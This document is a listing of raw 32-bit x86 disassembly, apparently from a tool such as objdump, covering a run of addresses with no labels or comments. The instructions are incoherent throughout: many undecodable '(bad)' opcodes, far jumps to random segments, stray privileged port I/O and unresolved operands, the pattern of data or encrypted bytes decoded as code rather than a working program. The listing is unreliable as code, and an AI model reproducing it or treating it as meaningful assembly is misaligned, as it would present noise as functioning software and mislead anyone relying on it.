  40dd79:	mov    al,0x82
  40dd7b:	mov    ecx,0x5d655c91
  40dd80:	pop    edx
  40dd81:	fdiv   st(4),st
  40dd83:	pop    ebx
  40dd84:	(bad)
  40dd88:	cmp    esi,DWORD PTR [esi+0x4d]
  40dd8b:	jmp    FWORD PTR [eax+0x66]
  40dd8e:	xor    dh,BYTE PTR [eax]
  40dd90:	outs   dx,BYTE PTR ds:[esi]
  40dd91:	push   esp
  40dd92:	fisub  WORD PTR [edi]
  40dd94:	pop    esi
  40dd95:	ret    0x9a45
  40dd98:	ins    DWORD PTR es:[edi],dx
  40dd99:	and    ah,ah
  40dd9b:	cmp    edx,esi
  40dd9d:	shl    BYTE PTR [eax],0xc2
  40dda0:	shl    DWORD PTR [ebp+0x32ce23d8],cl
  40dda6:	adc    DWORD PTR [esi],0x7aa2b933
  40ddac:	or     ebx,DWORD PTR [edi]
  40ddae:	mov    ebp,0x7f67ed26
  40ddb3:	(bad)  
  40ddb4:	(bad)  
  40ddb5:	and    BYTE PTR [esi+0x43],ch
  40ddb8:	push   edx
  40ddb9:	retf   0x6e56
  40ddbc:	pop    es
  40ddbd:	dec    eax
  40ddbe:	push   0xffffffcb
  40ddc0:	jno    0x40dd6a
  40ddc2:	out    dx,eax
  40ddc3:	inc    edi
  40ddc4:	dec    ebx
  40ddc5:	push   0x854c59dd
  40ddca:	push   0xb7242ffd
  40ddcf:	jmp    0xa8a4:0x7c4812e2
  40ddd6:	xor    edi,DWORD PTR [edx-0x57]
  40ddd9:	push   ds
  40ddda:	les    ecx,FWORD PTR [ebp-0x5a]
  40dddd:	sbb    al,0x5e
  40dddf:	jmp    0xbe23:0xc60866ed
  40dde6:	sbb    DWORD PTR [edi+0x19c40c3],esp
  40ddec:	sub    cl,dh
  40ddee:	cli    
  40ddef:	mov    ah,0x52
  40ddf1:	xor    cl,al
  40ddf3:	iret   
  40ddf4:	imul   ebx,DWORD PTR [ebx-0x53861b0b],0xb85dffc2
  40ddfe:	or     al,0xa9
  40de00:	aam    0x3d
  40de02:	out    dx,al
  40de03:	shr    DWORD PTR [ebp-0x47],0x4d
  40de07:	mov    ebp,0x4bd17f91
  40de0c:	xlat   BYTE PTR ds:[ebx]
  40de0d:	mov    cl,0x5
  40de0f:	jmp    0x56db:0xc1edae17
  40de16:	scas   al,BYTE PTR es:[edi]
  40de17:	(bad)  
  40de18:	repz in eax,dx
  40de1a:	leave  
  40de1b:	mov    ebx,0xeadb3bfb
  40de20:	push   ds
  40de21:	xchg   BYTE PTR [eax-0x4a],dl
  40de24:	push   es
  40de25:	jbe    0x40dde3
  40de27:	pusha  
  40de28:	dec    ebx
  40de29:	or     esp,DWORD PTR [edx+edi*8+0x27b8cc74]
  40de30:	mov    esi,0xfecb1c7d
  40de35:	or     al,0xe0
  40de37:	stos   BYTE PTR es:[edi],al
  40de38:	test   eax,0x4eeb97c5
  40de3d:	jb     0x40dde0
  40de3f:	in     eax,0xb4
  40de41:	adc    al,0x27
  40de43:	(bad)  
  40de44:	pop    esp
  40de45:	pop    edx
  40de46:	sbb    ch,BYTE PTR [eax-0x5f]
  40de49:	jl     0x40de72
  40de4b:	repnz push ss
  40de4d:	jecxz  0x40dec9
  40de4f:	push   ebx
  40de50:	in     eax,0xb6
  40de52:	and    ecx,DWORD PTR [edx+0x7eab7fc]
  40de58:	pop    es
  40de59:	sub    ah,BYTE PTR [edx-0x52e2d035]
  40de5f:	(bad)  
  40de60:	cli    
  40de61:	cdq    
  40de62:	xor    esp,DWORD PTR [edx-0xe]
  40de65:	cmp    ah,bl
  40de67:	dec    esp
  40de68:	sbb    BYTE PTR [ecx+0x9],0x5c
  40de6c:	(bad)  
  40de6d:	jae    0x40de0a
  40de6f:	cld    
  40de70:	sbb    eax,0xe2d30050
  40de75:	(bad)  
  40de76:	mov    al,ds:0x4027da33
  40de7b:	pushf  
  40de7c:	mov    esi,0x6bed56ae
  40de81:	mov    bh,0x2d
  40de83:	mov    esp,esp
  40de85:	inc    edx
  40de86:	(bad)  
  40de87:	dec    ebp
  40de88:	stc    
  40de89:	sti    
  40de8a:	outs   dx,BYTE PTR ds:[esi]
  40de8b:	(bad)  [edx-0x44e870d3]
  40de91:	fdiv   DWORD PTR [ebp-0x3c]
  40de94:	fidiv  DWORD PTR [edi-0x42]
  40de97:	nop
  40de98:	mov    edx,0x3e68cd61
  40de9d:	shl    edx,1
  40de9f:	data16 sti 
  40dea1:	pop    ebx
  40dea2:	ja     0x40de3f
  40dea4:	test   ah,bl
  40dea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dea7:	sbb    BYTE PTR [edi+0x319d1cc5],ch
  40dead:	clc    
  40deae:	aad    0xf7
  40deb0:	daa    
  40deb1:	arpl   WORD PTR [ecx],cx
  40deb3:	xor    BYTE PTR [edx+0x17],ch
  40deb6:	mov    cl,0xcb
  40deb8:	gs pop ecx
  40deba:	adc    DWORD PTR [ecx],0xffffff9f
  40debd:	mov    ah,0x7d
  40debf:	shr    BYTE PTR [ebx],1
  40dec1:	cli    
  40dec2:	addr16 dec esp
  40dec4:	sbb    al,0x5f
  40dec6:	jo     0x40ded6
  40dec8:	sar    DWORD PTR [edx-0x2b0b1057],0x7b
  40decf:	sbb    edx,DWORD PTR [ebx+0x75ad3be]
  40ded5:	cmc    
  40ded6:	dec    ebx
  40ded7:	pop    ss
  40ded8:	lods   eax,DWORD PTR ds:[esi]
  40ded9:	aas    
  40deda:	das    
  40dedb:	icebp  
  40dedc:	xchg   ebp,eax
  40dedd:	test   DWORD PTR [edi-0x44546964],esi
  40dee3:	inc    edx
  40dee4:	addr16 loop 0x40df27
  40dee7:	lock pop ebp
  40dee9:	mov    dh,0xd9
  40deeb:	hlt    
  40deec:	push   es
  40deed:	xor    al,0x46
  40deef:	retf   
  40def0:	pop    ss
  40def1:	pop    ecx
  40def2:	xor    cl,ah
  40def4:	jecxz  0x40df1b
  40def6:	shr    BYTE PTR [ebp+esi*8+0x760442d2],cl
  40defd:	push   esp
  40defe:	xchg   BYTE PTR [ecx-0x61],cl
  40df01:	pop    esp
  40df02:	sbb    esp,DWORD PTR [edi+edx*2-0x3a08747e]
  40df09:	push   edi
  40df0a:	push   0xffffffd8
  40df0c:	sbb    dl,BYTE PTR [esi]
  40df0e:	sar    DWORD PTR [ecx-0x44d662d],0x6e
  40df15:	xchg   ecx,eax
  40df16:	hlt    
  40df17:	ins    DWORD PTR es:[edi],dx
  40df18:	mov    ds,esp
  40df1a:	mov    al,0xc6
  40df1c:	cdq    
  40df1d:	iret   
  40df1e:	add    BYTE PTR [eax-0x48a43f9d],cl
  40df24:	xor    DWORD PTR [eax-0x7b],edi
  40df27:	pop    eax
  40df28:	cld    
  40df29:	loopne 0x40df92
  40df2b:	sub    al,0x9d
  40df2d:	add    BYTE PTR ds:0x8204cbc,0xf9
  40df34:	(bad)  
  40df35:	int3   
  40df36:	leave  
  40df37:	mov    ah,0x3d
  40df39:	retf   
  40df3a:	(bad)  
  40df3b:	sub    ebp,DWORD PTR [edx]
  40df3d:	push   ebx
  40df3e:	rol    DWORD PTR [esi],1
  40df40:	or     BYTE PTR [eax+0x10],dl
  40df43:	push   ebx
  40df44:	xor    eax,DWORD PTR [ecx-0x46]
  40df47:	ret    
  40df48:	adc    DWORD PTR [edx],edx
  40df4a:	add    esi,eax
  40df4c:	test   BYTE PTR [ebp+0x5784ec10],ch
  40df52:	fistp  WORD PTR [edx+0x33]
  40df55:	out    0xa0,al
  40df57:	mov    ?,WORD PTR [eax]
  40df59:	mov    edx,gs
  40df5b:	mov    ah,0x1d
  40df5d:	pop    edx
  40df5e:	push   ecx
  40df5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df60:	ret    
  40df61:	cs repz fwait
  40df64:	lock outs dx,DWORD PTR ds:[esi]
  40df66:	mov    ecx,0x3166987e
  40df6b:	ins    BYTE PTR es:[edi],dx
  40df6c:	test   DWORD PTR [edx],0x74046d1
  40df72:	scas   eax,DWORD PTR es:[edi]
  40df73:	sbb    BYTE PTR [ebx-0x31],bl
  40df76:	(bad)  
  40df77:	mul    ebx
  40df79:	test   BYTE PTR [edx],al
  40df7b:	stos   BYTE PTR es:[edi],al
  40df7c:	jmpw   0xdfe7
  40df80:	xchg   esp,eax
  40df81:	mov    dh,0x2b
  40df83:	lods   eax,DWORD PTR ds:[esi]
  40df84:	jmp    0x91c40702
  40df89:	sub    BYTE PTR ds:0x560e5fd3,ah
  40df8f:	sbb    ebp,DWORD PTR [esi-0x484b6188]
  40df95:	mov    ds:0x243ce241,eax
  40df9a:	mov    ch,0x7c
  40df9c:	daa    
  40df9d:	jmp    0xe49ea8f5
  40dfa2:	cmp    bl,cl
  40dfa4:	dec    eax
  40dfa5:	xchg   ebp,eax
  40dfa6:	cli    
  40dfa7:	ss fs aaa 
  40dfaa:	int3   
  40dfab:	sbb    cl,al
  40dfad:	cmp    ah,BYTE PTR [eax+0x5d]
  40dfb0:	add    BYTE PTR [ebp-0x168dc87d],dh
  40dfb6:	push   esp
  40dfb7:	mov    ds:0xebae20ae,al
  40dfbc:	cmp    DWORD PTR [ebx],ecx
  40dfbe:	jmp    0x40dffe
  40dfc0:	scas   eax,DWORD PTR es:[edi]
  40dfc1:	push   ds
  40dfc2:	punpcklwd mm4,DWORD PTR [esi-0xcab32a]
  40dfc9:	jnp    0x40dfb3
  40dfcb:	call   0x53e1abb1
  40dfd0:	leave  
  40dfd1:	mov    ecx,0xb90b7c55
  40dfd6:	sbb    cl,al
  40dfd8:	outs   dx,BYTE PTR ds:[esi]
  40dfd9:	(bad)  
  40dfda:	outs   dx,DWORD PTR ds:[esi]
  40dfdb:	cmc    
  40dfdc:	icebp  
  40dfdd:	dec    ebp
  40dfde:	sti    
  40dfdf:	jmp    0x4207:0xbd839d58
  40dfe6:	dec    ebx
  40dfe7:	sahf   
  40dfe8:	rep lods al,BYTE PTR ds:[esi]
  40dfea:	imul   ecx,esp,0xc4ce8e12
  40dff0:	(bad)  
  40dff2:	jecxz  0x40dfc2
  40dff4:	or     DWORD PTR ds:0xba22f66e,ebp
  40dffa:	sbb    dh,BYTE PTR [eax]
  40dffc:	mov    dl,0x9f
  40dffe:	sub    ebx,ecx
  40e000:	stos   DWORD PTR es:[edi],eax
  40e001:	pop    ss
  40e002:	mov    ecx,es
  40e004:	mov    dh,0xb1
  40e006:	shr    BYTE PTR [ecx+0x151619a1],1
  40e00c:	nop
  40e00d:	mov    bh,0x84
  40e00f:	mov    ah,ah
  40e011:	mov    bl,0x92
  40e013:	mov    ds:0xad62d79f,al
  40e018:	jl     0x40dfb6
  40e01a:	or     bl,0x64
  40e01d:	inc    ebx
  40e01e:	adc    eax,0xaf526a1d
  40e023:	cmp    eax,0x232195fb
  40e028:	lock lods eax,DWORD PTR ds:[esi]
  40e02a:	push   edi
  40e02b:	mov    dh,0x9a
  40e02d:	call   0x6abe:0x963a5dc6
  40e034:	lods   al,BYTE PTR ds:[esi]
  40e035:	xchg   edi,eax
  40e036:	add    al,0x2b
  40e038:	shr    BYTE PTR [ebx-0x75f88e6f],1
  40e03e:	mov    esi,0x4944bdf1
  40e043:	inc    edx
  40e044:	inc    esp
  40e045:	fdivr  QWORD PTR [eax+esi*1-0x2cfd3fd2]
  40e04c:	xadd   DWORD PTR [ebx],esp
  40e04f:	jge    0x40e05b
  40e051:	fwait
  40e052:	or     eax,0xd850bba5
  40e057:	es test dl,dl
  40e05a:	sbb    al,0x3c
  40e05c:	mov    bl,0xf7
  40e05e:	or     dl,BYTE PTR [esi-0x20]
  40e061:	out    dx,eax
  40e062:	pop    ecx
  40e063:	jle    0x40e04e
  40e065:	push   edx
  40e066:	into   
  40e067:	loope  0x40e07f
  40e069:	mov    ds:0xf9417ee2,eax
  40e06e:	push   ss
  40e06f:	and    eax,0x9d744845
  40e074:	mul    DWORD PTR [eax+eax*1-0x21]
  40e078:	add    al,0x1f
  40e07b:	jmp    0x40e0e1
  40e07d:	mov    ah,BYTE PTR [edx]
  40e07f:	xor    DWORD PTR ds:0xb0778534,edi
  40e085:	loop   0x40e092
  40e087:	xchg   ecx,eax
  40e088:	lea    eax,[ebx-0xa]
  40e08b:	jae    0x40e0d7
  40e08d:	in     al,dx
  40e08e:	mov    WORD PTR ds:0x82b2a107,es
  40e094:	jle    0x40e08e
  40e096:	jmp    0x40e048
  40e098:	scas   eax,DWORD PTR es:[edi]
  40e099:	push   ebp
  40e09a:	mov    cl,0x48
  40e09c:	cmc    
  40e09d:	mov    bh,0xfe
  40e09f:	out    dx,al
  40e0a0:	cmp    DWORD PTR [edx+0x25bf267b],esp
  40e0a6:	popf   
  40e0a7:	imul   ecx,DWORD PTR [ebx-0x53],0xb564b4b6
  40e0ae:	shl    DWORD PTR [esi+edx*1-0x20],0x1a
  40e0b3:	fwait
  40e0b4:	xchg   edi,eax
  40e0b5:	sti    
  40e0b6:	push   0x633c74be
  40e0bb:	push   eax
  40e0bc:	out    dx,al
  40e0bd:	frstor [esi+0x6f5c3df9]
  40e0c3:	loopne 0x40e04b
  40e0c5:	sub    esp,ebx
  40e0c7:	mov    dh,0x59
  40e0c9:	popa   
  40e0ca:	adc    al,0xd4
  40e0cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0cd:	xor    dh,BYTE PTR [esi+ebp*2+0x32cca2cb]
  40e0d4:	push   0x41
  40e0d6:	(bad)  
  40e0d7:	enter  0x5fbf,0x2c
  40e0db:	nop
  40e0dc:	jg     0x40e14b
  40e0de:	hlt    
  40e0df:	aad    0x23
  40e0e1:	push   ds
  40e0e2:	lahf   
  40e0e3:	iret   
  40e0e4:	xchg   BYTE PTR [ecx-0x57],al
  40e0e7:	push   eax
  40e0e8:	mov    eax,?
  40e0ea:	les    edi,FWORD PTR [edx+0x45230b33]
  40e0f0:	stc    
  40e0f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0f2:	lods   al,BYTE PTR ds:[esi]
  40e0f3:	xchg   esi,esp
  40e0f5:	aad    0x4d
  40e0f7:	into   
  40e0f8:	test   al,0x2e
  40e0fa:	out    dx,eax
  40e0fb:	jns    0x40e164
  40e0fd:	scas   eax,DWORD PTR es:[edi]
  40e0fe:	adc    ah,BYTE PTR [ecx-0x2d]
  40e101:	push   edi
  40e102:	arpl   dx,di
  40e104:	aad    0xd6
  40e106:	dec    edx
  40e107:	aas    
  40e108:	inc    ebx
  40e109:	adc    esi,edx
  40e10b:	nop
  40e10c:	jbe    0x40e09e
  40e10e:	jnp    0x40e103
  40e110:	push   eax
  40e111:	push   es
  40e112:	mov    DWORD PTR [ebx-0x545f0423],edi
  40e118:	push   esp
  40e119:	adc    edi,esi
  40e11b:	jb     0x40e14b
  40e11d:	sub    eax,0x9480af17
  40e123:	scas   al,BYTE PTR es:[edi]
  40e124:	call   0x5813:0x647a27ee
  40e12b:	aaa    
  40e12c:	jno    0x40e107
  40e12e:	add    dl,BYTE PTR [ebp-0x5314ff87]
  40e134:	inc    esi
  40e135:	retf   0xe1ee
  40e138:	fcomp  DWORD PTR ds:0x947004b
  40e13e:	xor    DWORD PTR [ebx-0x22],esi
  40e141:	lahf   
  40e142:	dec    esp
  40e143:	popf   
  40e144:	dec    edi
  40e145:	cmp    al,dl
  40e147:	push   esp
  40e148:	push   ss
  40e149:	adc    BYTE PTR [ebp-0x57],ch
  40e14c:	jo     0x40e0ff
  40e14e:	arpl   WORD PTR [edi],bp
  40e150:	jecxz  0x40e177
  40e152:	pop    edi
  40e153:	mov    edx,0xa089858e
  40e158:	into   
  40e159:	imul   BYTE PTR [ecx-0x161a44fc]
  40e15f:	popa   
  40e160:	pop    eax
  40e161:	int3   
  40e162:	sub    eax,0x8cc7cb85
  40e167:	bound  edi,QWORD PTR [edx+edi*4+0x5ac7077c]
  40e16e:	push   eax
  40e16f:	mov    ecx,0x55f4edea
  40e174:	aaa    
  40e175:	aas    
  40e176:	std    
  40e177:	mov    ebx,edi
  40e179:	push   eax
  40e17a:	or     BYTE PTR [ebx],0x42
  40e17d:	repnz aas 
  40e17f:	push   ebx
  40e180:	call   0xf79016a4
  40e185:	jecxz  0x40e158
  40e187:	sbb    DWORD PTR [edx],ebx
  40e189:	int    0x48
  40e18b:	into   
  40e18c:	cli    
  40e18d:	mov    BYTE PTR [eax+0x6f20fc2a],dl
  40e193:	call   0xa93fa9e7
  40e198:	push   eax
  40e199:	gs xor al,0xc8
  40e19c:	mov    al,0xd8
  40e19e:	cld    
  40e19f:	daa    
  40e1a0:	rcr    edi,1
  40e1a2:	bound  esi,QWORD PTR [edi+0x3]
  40e1a5:	jmp    0x5230:0xe1afe4ec
  40e1ac:	mov    ds:0xfe737b86,eax
  40e1b1:	aaa    
  40e1b2:	sti    
  40e1b3:	mov    DWORD PTR [ecx-0x79a1483a],0xbe0b5c7f
  40e1bd:	(bad)  
  40e1be:	xor    al,0x86
  40e1c0:	outs   dx,DWORD PTR ds:[esi]
  40e1c1:	popf   
  40e1c2:	or     cl,BYTE PTR [edi+0x30]
  40e1c5:	ins    BYTE PTR es:[edi],dx
  40e1c6:	mov    ah,0xf4
  40e1c8:	daa    
  40e1c9:	leave  
  40e1ca:	adc    BYTE PTR [ebx-0x21],cl
  40e1cd:	outs   dx,BYTE PTR ds:[esi]
  40e1ce:	bound  ebp,QWORD PTR [eax-0x1cc16bb5]
  40e1d4:	retf   0x5bec
  40e1d7:	imul   edi,DWORD PTR [ecx-0x740ad341],0x6d
  40e1de:	pop    eax
  40e1df:	cmc    
  40e1e0:	or     edx,0xffffffc2
  40e1e3:	cmp    BYTE PTR [eax+0x4d],0x19
  40e1e7:	or     cl,dl
  40e1e9:	les    ebx,FWORD PTR [edi+0x79e84d20]
  40e1ef:	sar    BYTE PTR [ebx+ebp*4+0x914cf2c],0x3a
  40e1f7:	shl    ebx,1
  40e1f9:	adc    DWORD PTR [ebp+0x15],0x2a84030e
  40e200:	jge    0x40e21c
  40e202:	popf   
  40e203:	lods   al,BYTE PTR ds:[esi]
  40e204:	inc    esi
  40e205:	icebp  
  40e206:	and    eax,DWORD PTR [ecx]
  40e208:	ins    DWORD PTR es:[edi],dx
  40e209:	mov    dl,0x87
  40e20b:	leave  
  40e20c:	nop
  40e20d:	fwait
  40e20e:	cs and eax,0xf7f86c3f
  40e214:	jae    0x40e25c
  40e216:	out    0x6a,eax
  40e218:	jne    0x40e262
  40e21a:	sub    BYTE PTR [ebx+0x77b08df3],ah
  40e220:	lds    ebp,FWORD PTR [edi+0x61d5f74f]
  40e226:	push   DWORD PTR [eax]
  40e228:	sbb    esp,DWORD PTR [ebp+0x6268898a]
  40e22e:	jnp    0x40e1ef
  40e230:	repz xchg ebp,eax
  40e232:	stc    
  40e233:	ror    DWORD PTR [eax+0x6d],cl
  40e236:	jp     0x40e1d8
  40e238:	sub    eax,0xf9452b6
  40e23d:	test   al,0xfd
  40e23f:	or     al,0xe1
  40e241:	mov    WORD PTR [ebx-0xb],?
  40e244:	mov    al,ds:0xb34446c9
  40e249:	mov    ebx,0x37544f5c
  40e24e:	leave  
  40e24f:	dec    esi
  40e250:	or     DWORD PTR [ebx+0x350513c0],esp
  40e256:	hlt    
  40e257:	jl     0x40e230
  40e259:	jle    0x40e24e
  40e25b:	mov    eax,DWORD PTR [ecx]
  40e25d:	jecxz  0x40e206
  40e25f:	iret   
  40e260:	adc    cl,bh
  40e262:	push   edx
  40e263:	pusha  
  40e264:	jl     0x40e20f
  40e266:	add    ch,BYTE PTR [ebx+esi*8-0x4fbe0f47]
  40e26d:	xor    ch,BYTE PTR [ebx]
  40e26f:	sbb    ecx,esp
  40e271:	mov    edx,0xd949677
  40e276:	pop    ecx
  40e277:	add    eax,0x7c5441a9
  40e27c:	(bad)  
  40e27d:	pop    edx
  40e27e:	sbb    dh,BYTE PTR [edx]
  40e280:	mov    ch,BYTE PTR [edi+0x3b]
  40e283:	inc    esi
  40e284:	in     al,0xfa
  40e286:	xchg   ebp,eax
  40e287:	inc    ecx
  40e288:	mov    bh,0xa0
  40e28a:	inc    edi
  40e28b:	ja     0x40e271
  40e28d:	or     DWORD PTR [ebp-0x7b291d9a],ebp
  40e293:	aam    0x6f
  40e295:	cwde   
  40e296:	and    dh,BYTE PTR [eax]
  40e298:	sar    dh,1
  40e29a:	xor    BYTE PTR [ebx],dh
  40e29c:	out    0xc0,al
  40e29e:	rcl    cl,0x7c
  40e2a1:	rol    BYTE PTR [eax],0x84
  40e2a4:	outs   dx,DWORD PTR ds:[esi]
  40e2a5:	jge    0x40e292
  40e2a7:	mov    ds:0x247fb2c8,eax
  40e2ac:	ds sahf 
  40e2ae:	mov    esp,0x8cf2a7f9
  40e2b3:	lods   al,BYTE PTR ds:[esi]
  40e2b4:	in     al,0xed
  40e2b6:	inc    edi
  40e2b7:	popf   
  40e2b8:	or     eax,DWORD PTR [eax+0x6f]
  40e2bb:	sub    ecx,DWORD PTR [ecx]
  40e2bd:	jecxz  0x40e25d
  40e2bf:	stos   DWORD PTR es:[edi],eax
  40e2c0:	ret    0xd328
  40e2c3:	aas    
  40e2c4:	cdq    
  40e2c5:	mov    ebp,DWORD PTR [edi+0x4f32dd8]
  40e2cb:	xor    DWORD PTR [esi+eax*2],0x6c
  40e2cf:	retf   
  40e2d0:	test   eax,0x505cf85e
  40e2d5:	fdivr  DWORD PTR [ebx+0x149a8f0c]
  40e2db:	push   es
  40e2dc:	mov    ds:0x769bde7d,al
  40e2e1:	mov    ds:0x74835253,eax
  40e2e6:	addr16 inc ecx
  40e2e8:	dec    esp
  40e2e9:	lods   al,BYTE PTR ds:[esi]
  40e2ea:	or     DWORD PTR ds:0x6467b6e9,0x56
  40e2f1:	jae    0x40e2c0
  40e2f3:	inc    ebx
  40e2f4:	sub    ebp,DWORD PTR [esi-0x37]
  40e2f7:	push   ecx
  40e2f8:	icebp  
  40e2f9:	jmp    0x56a0:0xa912a6b2
  40e300:	xchg   ebp,eax
  40e301:	adc    BYTE PTR [ebp-0x74],ah
  40e304:	int    0xc3
  40e306:	cmp    al,0x86
  40e308:	inc    ebx
  40e309:	out    0xa4,al
  40e30b:	pop    esp
  40e30c:	dec    edx
  40e30d:	int3   
  40e30e:	push   ebx
  40e30f:	xchg   ecx,eax
  40e310:	pop    ds
  40e311:	pushf  
  40e312:	xchg   ebx,eax
  40e313:	sar    DWORD PTR [edx],1
  40e315:	je     0x40e2de
  40e317:	sub    DWORD PTR [ecx-0x3031f247],0x98c48272
  40e321:	push   ds
  40e322:	addr16 out 0x25,al
  40e325:	inc    ebx
  40e326:	jp     0x40e364
  40e328:	pop    esp
  40e329:	sar    BYTE PTR [ebx+0x4261c219],0x23
  40e330:	add    DWORD PTR [eiz*1+0x1e5ac209],esp
  40e337:	mov    ds:0xf523b729,eax
  40e33c:	or     bh,BYTE PTR [ebx-0x45f1c0fe]
  40e342:	push   ss
  40e343:	or     eax,0xc0adf387
  40e348:	or     eax,0xdd23526
  40e34d:	push   ds
  40e34e:	inc    ebp
  40e34f:	push   0x55
  40e351:	pop    ebp
  40e352:	repz add edi,DWORD PTR [eax+0x7e]
  40e356:	dec    esi
  40e357:	frstor [ebx-0x528a78cf]
  40e35d:	(bad)  
  40e35e:	mov    esi,0xfa70f7c0
  40e363:	call   FWORD PTR [edi+0x4d]
  40e366:	and    eax,0xa1adc1c6
  40e36b:	test   bl,ah
  40e36d:	jbe    0x40e362
  40e36f:	mov    dl,0xa3
  40e371:	jae    0x40e381
  40e373:	(bad)  
  40e374:	dec    ebx
  40e375:	jns    0x40e346
  40e377:	dec    ecx
  40e378:	fsubr  st(1),st
  40e37a:	out    dx,eax
  40e37b:	mov    ds:0xa6efa837,al
  40e380:	add    DWORD PTR [esi-0x45bb8cf],ebp
  40e386:	or     esi,DWORD PTR ds:0x985d89b0
  40e38c:	add    al,cl
  40e38e:	sti    
  40e38f:	(bad)  
  40e390:	jg     0x40e3c3
  40e392:	mul    esp
  40e394:	aas    
  40e395:	pusha  
  40e396:	lods   eax,DWORD PTR ds:[esi]
  40e397:	or     eax,DWORD PTR [edi]
  40e399:	out    dx,al
  40e39a:	xor    DWORD PTR [edx],esi
  40e39c:	cmp    al,0x6c
  40e39e:	mov    ebx,0xde0e5444
  40e3a3:	push   edx
  40e3a4:	aaa    
  40e3a5:	add    BYTE PTR [edx-0x1a8529a4],ch
  40e3ab:	scas   al,BYTE PTR es:[edi]
  40e3ac:	jae    0x40e3d8
  40e3ae:	out    0x15,al
  40e3b0:	pushf  
  40e3b1:	scas   eax,DWORD PTR es:[edi]
  40e3b2:	inc    ecx
  40e3b3:	push   0x39
  40e3b5:	xchg   ebp,eax
  40e3b6:	add    eax,0x79013cd1
  40e3bb:	fisub  DWORD PTR gs:[ecx+0x1a]
  40e3bf:	add    DWORD PTR [edx-0x1c],eax
  40e3c2:	mov    cl,0x58
  40e3c4:	xchg   BYTE PTR [edx+0x697e2340],cl
  40e3ca:	mov    ecx,0xfeae9400
  40e3cf:	cmp    eax,0xafb9b939
  40e3d4:	scas   al,BYTE PTR es:[edi]
  40e3d5:	(bad)  
  40e3d7:	inc    ecx
  40e3d8:	fs stos BYTE PTR es:[edi],al
  40e3da:	(bad)  
  40e3db:	scas   al,BYTE PTR es:[edi]
  40e3dc:	add    ch,bh
  40e3de:	mov    cl,BYTE PTR fs:[ecx]
  40e3e1:	gs jns 0x40e3a2
  40e3e4:	repnz xor eax,0x569c5186
  40e3ea:	fmul   QWORD PTR [ecx]
  40e3ec:	les    edi,FWORD PTR [edx+eax*4-0x73]
  40e3f0:	mov    ah,dl
  40e3f2:	inc    eax
  40e3f3:	add    eax,0x5af170a8
  40e3f8:	in     al,0x87
  40e3fa:	(bad)  
  40e3fb:	cs daa 
  40e3fd:	lods   eax,DWORD PTR ds:[esi]
  40e3fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3ff:	nop
  40e400:	cmp    edx,DWORD PTR [esi+0x53a9b49a]
  40e406:	aam    0x8c
  40e408:	xor    al,0x84
  40e40a:	ins    DWORD PTR es:[edi],dx
  40e40b:	aaa    
  40e40c:	inc    edi
  40e40d:	aas    
  40e40e:	jnp    0x40e45e
  40e410:	les    ebx,FWORD PTR [edx-0x3caca5c]
  40e416:	data16 das 
  40e418:	sub    al,0xa7
  40e41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e41b:	pop    ebp
  40e41c:	popf   
  40e41d:	les    esp,FWORD PTR [edi+0xcbc7b69]
  40e423:	sbb    ah,BYTE PTR [eax+0x66]
  40e426:	dec    esp
  40e427:	arpl   di,bx
  40e429:	fbld   TBYTE PTR [edi]
  40e42b:	scas   al,BYTE PTR es:[edi]
  40e42c:	out    0x86,eax
  40e42e:	arpl   ax,cx
  40e430:	out    0x97,al
  40e432:	pusha  
  40e433:	repnz aad 0x7e
  40e436:	mov    eax,ds:0x6abb2bd5
  40e43b:	sbb    al,0xab
  40e43d:	jmp    0x2ecc1167
  40e442:	js     0x40e480
  40e444:	(bad)  
  40e445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e446:	lds    ecx,FWORD PTR [esi+0x26f4f067]
  40e44c:	ret    0x4849
  40e44f:	mov    ebx,0xdf6e69f
  40e454:	inc    BYTE PTR [esi+0x4426a341]
  40e45a:	stos   DWORD PTR es:[edi],eax
  40e45b:	fisttp DWORD PTR [esp+ebp*1+0x4f]
  40e45f:	cmp    eax,0xefcdd820
  40e464:	out    0x59,al
  40e466:	jo     0x40e4d2
  40e468:	or     esp,DWORD PTR [esi]
  40e46a:	mov    esi,0x67550166
  40e470:	hlt    
  40e471:	add    BYTE PTR [ebp+0x4699fdfa],al
  40e477:	xlat   BYTE PTR ds:[ebx]
  40e478:	and    dl,BYTE PTR [edx-0x4e]
  40e47b:	pop    es
  40e47c:	xchg   ebp,eax
  40e47d:	xchg   edx,eax
  40e47e:	or     esp,DWORD PTR [esp+edi*2+0x1e5acd4e]
  40e485:	pop    ecx
  40e486:	retf   0x7952
  40e489:	fist   DWORD PTR gs:[ebx+0x5a18f0b2]
  40e490:	ds mov esi,0x4a3d1978
  40e496:	(bad)
  40e49a:	or     BYTE PTR [ebp+esi*1+0x5e],cl
  40e49e:	shr    al,cl
  40e4a0:	jg     0x40e4c2
  40e4a2:	(bad)  
  40e4a3:	and    al,0x67
  40e4a5:	out    dx,eax
  40e4a6:	cld    
  40e4a7:	jo     0x40e4b7
  40e4a9:	out    dx,eax
  40e4aa:	fcom   DWORD PTR [ecx]
  40e4ac:	cmp    eax,0x7f2fd869
  40e4b1:	loopne 0x40e507
  40e4b3:	mov    al,0x83
  40e4b5:	mov    edx,0xc23fc582
  40e4ba:	mov    cl,0x12
  40e4bc:	xchg   edi,eax
  40e4bd:	xchg   cl,dl
  40e4bf:	stos   BYTE PTR es:[edi],al
  40e4c0:	test   BYTE PTR [esi],ch
  40e4c2:	push   0x2f
  40e4c4:	repnz arpl WORD PTR [ebx-0x3d466727],si
  40e4cb:	into   
  40e4cc:	jge    0x40e47e
  40e4ce:	adc    dl,ch
  40e4d0:	(bad)  
  40e4d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4d3:	inc    ecx
  40e4d4:	mov    ds:0x545d9bba,eax
  40e4d9:	loope  0x40e478
  40e4db:	int    0x66
  40e4dd:	rcl    ebx,cl
  40e4df:	sbb    esi,ebp
  40e4e1:	loop   0x40e509
  40e4e3:	dec    esp
  40e4e4:	inc    edi
  40e4e5:	sbb    BYTE PTR [esi+0x2],bh
  40e4e8:	mov    ebp,0x353b299f
  40e4ed:	call   0xb265c74a
  40e4f2:	mov    edx,0xc729eb9c
  40e4f7:	lds    ebx,FWORD PTR [esi+0x128851b0]
